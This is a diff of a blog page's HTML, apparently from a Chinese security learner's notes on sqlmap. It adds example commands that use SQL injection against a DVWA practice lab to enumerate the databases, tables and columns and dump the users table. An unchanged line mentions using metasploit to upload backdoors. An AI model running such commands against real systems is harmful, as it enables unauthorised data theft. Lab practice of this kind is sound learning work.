@@ -278,11 +278,29 @@
 <li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门。</li>
 </ul>
 <h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><h5 id="GET方法测试"><a href="#GET方法测试" class="headerlink" title="GET方法测试"></a>GET方法测试</h5><ul>
-<li>-u ，要测试的链接</li>
+<li>-u ，要测试的链接<ul>
+<li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot;</code></li>
+</ul>
+</li>
 <li>-f，获得数据库指纹信息</li>
 <li>–users，获得数据库用户数据</li>
 <li>–banner，获得banner信息</li>
-<li>–dbs，目标数据库中有哪些库</li>
+<li>–dbs，目标数据库中有哪些库<ul>
+<li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; --dbs</code></li>
+</ul>
+</li>
+<li>-D 数据库 –tables,查看库中有哪些表<ul>
+<li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa --tables</code></li>
+</ul>
+</li>
+<li>-D 数据库 -T 表名 –columns<ul>
+<li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users --columns</code></li>
+</ul>
+</li>
+<li>-dump<ul>
+<li><code>sqlmap -u &quot;http://www.dvssc.com/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=mrqrkm9hfcqrdt8gluktgjgv32&quot; -D dvwa -T users -dump</code></li>
+</ul>
+</li>
 <li>–schema，元数据</li>
 <li>-a ，所有的</li>
 <li>-d，直连 <ul>
@@ -418,7 +436,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">82</a></div>
+      <div><a href="/archives/">84</a></div>
     </div>
     
     
@@ -432,7 +450,7 @@
     
     <div class="tags-count count-block">
       <div class="site-count-title">标签</div>
-      <div><a href="/tags/">12</a></div>
+      <div><a href="/tags/">14</a></div>
     </div>
     
     
@@ -505,7 +523,7 @@
     <div class="footer-container">
       <div class="footer-left">
         <div class="copyright">
-          <span class="author">Pyrrhax</span><span class="year"><i class="far fa-copyright"></i>2020</span>
+          <span class="author">Pyrrhax</span><span class="year"><i class="far fa-copyright"></i>2021</span>
         </div>
         
         <div class="busuanzi">
